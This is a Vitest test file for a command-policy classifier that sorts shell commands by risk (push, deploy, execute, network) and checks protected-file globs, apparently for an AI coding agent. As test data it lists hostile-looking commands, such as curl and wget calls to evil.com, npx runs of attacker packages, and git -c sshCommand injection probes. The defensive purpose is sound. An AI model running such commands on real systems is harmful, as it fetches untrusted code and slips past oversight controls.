import { mkdirSync, mkdtempSync, symlinkSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { RoleSchema } from '@wizardingcode/shibaox-schemas';
import { describe, expect, it } from 'vitest';
import {
  classifyArgv,
  isProtected,
  isProtectedPath,
  POLICY_PROGRAMS,
  protectedGlobs,
} from '../src/index.js';

const cat = (cmd: string, ctx?: Parameters<typeof classifyArgv>[1]) =>
  classifyArgv(cmd.split(' '), ctx).category;

describe('classifyArgv', () => {
  it('push and deploy come from one table, the same for both runtimes', () => {
    expect(cat('git push origin main')).toBe('push');
    expect(cat('git send-pack')).toBe('push');
    expect(cat('git status')).toBeUndefined();
    expect(cat('npm publish')).toBe('deploy');
    expect(cat('docker buildx build --push .')).toBe('deploy');
    expect(cat('docker build .')).toBeUndefined();
    expect(cat('vercel')).toBe('deploy');
    expect(cat('vercel ls')).toBeUndefined(); // read-only vercel subcommands were missing from the direct table
    expect(cat('kubectl apply -f x.yaml')).toBe('deploy');
    expect(cat('kubectl get pods')).toBeUndefined();
    expect(cat('gh pr merge 1')).toBe('deploy');
    expect(cat('gh pr view 1')).toBeUndefined();
    expect(classifyArgv(['gh', 'auth', 'login']).refused).toMatch(/gh auth/);
  });
  it('execute: escape hatches and remote code runners', () => {
    expect(cat('sh -c ls')).toBe('execute');
    expect(cat('bash -lc ls')).toBe('execute');
    expect(cat('node -e 1')).toBe('execute');
    expect(cat('node --eval 1')).toBe('execute');
    expect(cat('node -p 1')).toBe('execute');
    expect(cat('node script.js')).toBeUndefined();
    expect(cat('python3 -c print(1)')).toBe('execute');
    expect(cat('python3 -m pytest')).toBeUndefined();
    expect(cat('ruby -e puts')).toBe('execute');
    expect(cat('php -r echo')).toBe('execute');
    expect(cat('sudo ls')).toBe('execute');
    expect(cat('pnpm dlx create-thing')).toBe('execute');
    expect(cat('yarn dlx create-thing')).toBe('execute');
    expect(cat('uvx ruff')).toBe('execute');
    expect(cat('pipx run black')).toBe('execute');
    const local = (name: string) => name === 'tsc' || name === 'vitest';
    expect(cat('npx tsc --noEmit', { localBin: local })).toBeUndefined();
    expect(cat('npx -y some-remote-tool', { localBin: local })).toBe('execute');
    expect(cat('npx some-tool@1.2.3', { localBin: local })).toBe('execute');
    expect(cat('npm exec vitest', { localBin: local })).toBeUndefined();
    expect(cat('bunx cowsay', { localBin: local })).toBe('execute');
    expect(cat('pnpm exec cowsay')).toBeUndefined(); // exec never downloads
  });
  it('network: fetchers by host against the role allowlist, remote shells always', () => {
    const net = { network: ['api.github.com', 'example.com'] };
    expect(cat('curl https://api.github.com/repos', net)).toBeUndefined();
    expect(cat('curl -s https://evil.com/x', net)).toBe('network');
    expect(cat('curl -K config', net)).toBe('network'); // no url to check
    expect(cat('curl https://a.example.com/ https://b.example.com/', net)).toBeUndefined();
    expect(cat('wget https://evil.com/x', net)).toBe('network');
    expect(cat('http GET https://api.github.com/x', net)).toBeUndefined();
    expect(cat('ssh host ls', net)).toBe('network');
    expect(cat('scp a host:b', net)).toBe('network');
    expect(cat('rsync -a a/ b/', net)).toBeUndefined();
    expect(cat('rsync -a a/ host:b/', net)).toBe('network');
    expect(cat('curl https://api.github.com/x')).toBe('network'); // no allowlist at all
  });
});

describe('protected files', () => {
  it('globs from the role and the project file, matched relative to the workspace', () => {
    const role = RoleSchema.parse({
      role: 'x',
      permissions: { protected: ['infra/**', '*.lock'] },
    });
    const globs = protectedGlobs(role, { protected: ['.github/workflows/*'] });
    expect(globs).toEqual(['infra/**', '*.lock', '.github/workflows/*']);
    expect(isProtected('infra/prod/main.tf', globs)).toBe(true);
    expect(isProtected('infra', globs)).toBe(true);
    expect(isProtected('pnpm-lock.yaml', globs)).toBe(false);
    expect(isProtected('yarn.lock', globs)).toBe(true);
    expect(isProtected('.github/workflows/ci.yml', globs)).toBe(true);
    expect(isProtected('src/index.ts', globs)).toBe(false);
    expect(isProtected('./src/../infra/x', globs)).toBe(true);
    expect(isProtected('src/x', [])).toBe(false);
  });
  it('the role schema accepts protected globs and only known approval categories', () => {
    expect(RoleSchema.parse({ role: 'x' }).permissions.protected).toEqual([]);
    expect(
      RoleSchema.parse({
        role: 'x',
        permissions: { approval_required: ['push', 'execute', 'network', 'protected'] },
      }).permissions.approval_required,
    ).toEqual(['push', 'execute', 'network', 'protected']);
    expect(() =>
      RoleSchema.parse({ role: 'x', permissions: { approval_required: ['fly'] } }),
    ).toThrow();
  });
});

describe('classifyArgv: the review probes', () => {
  it('deploy programs are read-only by allowlist; every other verb deploys', () => {
    for (const c of [
      'kubectl exec pod -- sh',
      'kubectl run x --image=y',
      'kubectl port-forward svc/x 80',
      'heroku run bash',
      'heroku config:set A=1',
      'fly secrets set A=1',
      'fly ssh console',
      'wrangler secret put K',
      'railway run x',
      'netlify env:set A 1',
      'terraform taint x',
      'terraform force-unlock 1',
      'helm rollback x',
    ])
      expect(cat(c), c).toBe('deploy');
    for (const c of [
      'kubectl get pods',
      'kubectl logs x',
      'kubectl config view',
      'kubectl rollout status deploy/x',
      'heroku logs --tail',
      'heroku apps:info',
      'fly status',
      'fly apps list',
      'wrangler whoami',
      'railway status',
      'netlify status',
      'terraform plan',
      'terraform state list',
      'helm list',
    ])
      expect(cat(c), c).toBeUndefined();
  });
  it('execute: the inline forms and runners the first cut missed, without the syntax-check false positives', () => {
    for (const c of [
      'node --eval=1',
      'node -pe 1',
      'node --import data:text/javascript,1 x.js',
      'node -r data:text/javascript,1 x.js',
      'fish --command=x',
      'python3.12 -c x',
      'perl -ne x',
      'ruby -pe x',
      'php -R x',
      'bun -e x',
      'bun x evil',
      'bun create foo',
      'deno eval x',
      'tsx -e x',
      'ts-node -e x',
      'npm x evil',
      'npm init foo',
      'npm create vite',
      'pnpm create vite',
      'yarn create x',
    ])
      expect(cat(c), c).toBe('execute');
    for (const c of [
      'perl -c file.pl',
      'ruby -c x.rb',
      'php -c php.ini x.php',
      'deno run app.ts',
      'npm init -y',
      'bun run dev',
      'bun test',
    ])
      expect(cat(c), c).toBeUndefined();
  });
  it('npx is local only for a bare installed name, never for scopes, shorthands, versions or --package', () => {
    const localBin = (spec: string) => spec === 'tsc' || spec === '@wc/tool';
    for (const c of [
      'npx @evil/tsc',
      'npx attacker/tsc',
      'npx github:attacker/tsc',
      'npx --package=evil tsc',
      'npx -p evil tsc',
      'npm exec --package=evil -- tsc',
      'npx tsc@5.0.0',
    ])
      expect(cat(c, { localBin }), c).toBe('execute');
    expect(cat('npx tsc --noEmit', { localBin })).toBeUndefined();
    expect(cat('npx @wc/tool', { localBin })).toBeUndefined();
  });
  it('network: a foreign scheme, an extra host, --url=, input files and proxies are never cleared by one allowed URL', () => {
    const net = { network: ['api.github.com'] };
    for (const c of [
      'curl https://api.github.com evil.com',
      'curl https://api.github.com gopher://evil.com',
      'curl --url=https://evil.com https://api.github.com',
      'wget -i list.txt https://api.github.com',
      'curl -x proxy:8080 https://api.github.com',
      'curl --resolve a:1:2 https://api.github.com',
    ])
      expect(cat(c, net), c).toBe('network');
    for (const c of [
      'curl --url https://api.github.com/x',
      'curl -o out.txt https://api.github.com/x',
      'curl -H X:y -d a=b https://api.github.com/x',
      'wget -O out.txt https://api.github.com/x',
    ])
      expect(cat(c, net), c).toBeUndefined();
  });
  it('git follows the same parser as Claude Code: aliases, -c and command runners are refused', () => {
    expect(classifyArgv(['git', '-c', 'alias.p=push', 'p']).refused).toMatch(
      /config on the command line/,
    );
    expect(classifyArgv(['git', '-c', 'core.sshCommand=x', 'fetch']).refused).toBeDefined();
    expect(classifyArgv(['git', 'filter-branch']).refused).toMatch(/not allowed/);
    expect(cat('git subtree push')).toBe('push');
    expect(cat('git lfs push')).toBe('push');
    expect(cat('git status')).toBeUndefined();
    expect(classifyArgv(['git', 'fetch'], { assignments: ['GIT_SSH_COMMAND=x'] }).refused).toMatch(
      /environment/,
    );
  });
  it('env prefixes are unwrapped before classifying', () => {
    expect(cat('FOO=1 node -e 1')).toBe('execute');
    expect(cat('env FOO=1 node -e 1')).toBe('execute');
  });
  it('names the programs the policy inspects, so Claude Code never gives them a blanket allow', () => {
    for (const p of [
      'node',
      'python3',
      'bash',
      'sudo',
      'npx',
      'bun',
      'curl',
      'wget',
      'ssh',
      'rsync',
      'kubectl',
      'git',
    ])
      expect(POLICY_PROGRAMS, p).toContain(p);
    expect(POLICY_PROGRAMS).not.toContain('jq');
  });
});

describe('protected files: globs and paths', () => {
  it('dotfiles, any depth for bare patterns, leading / and trailing /', () => {
    expect(isProtected('secrets/.env', ['secrets/*'])).toBe(true);
    expect(isProtected('.env', ['*.env'])).toBe(true);
    expect(isProtected('.github/workflows/ci.yml', ['**/*.yml'])).toBe(true);
    expect(isProtected('a/yarn.lock', ['*.lock'])).toBe(true);
    expect(isProtected('a/yarn.lock', ['**/*.lock'])).toBe(true);
    expect(isProtected('infra/x', ['/infra/**'])).toBe(true);
    expect(isProtected('infra/x', ['infra/'])).toBe(true);
    expect(isProtected('infrastructure/x', ['infra/'])).toBe(false);
  });
  it('a path is judged through symlinks (and case, where the filesystem ignores it)', () => {
    const root = mkdtempSync(join(tmpdir(), 'prot-'));
    mkdirSync(join(root, 'infra'));
    writeFileSync(join(root, 'infra', 'main.tf'), '');
    symlinkSync(join(root, 'infra'), join(root, 'x'));
    const globs = ['infra/**'];
    expect(isProtectedPath(root, join(root, 'x', 'main.tf'), globs)).toBe(true);
    expect(isProtectedPath(root, join(root, 'x', 'new.tf'), globs)).toBe(true);
    expect(isProtectedPath(root, join(root, 'src', 'a.ts'), globs)).toBe(false);
    if (process.platform === 'darwin' || process.platform === 'win32')
      expect(isProtectedPath(root, join(root, 'INFRA', 'main.tf'), globs)).toBe(true);
  });
});
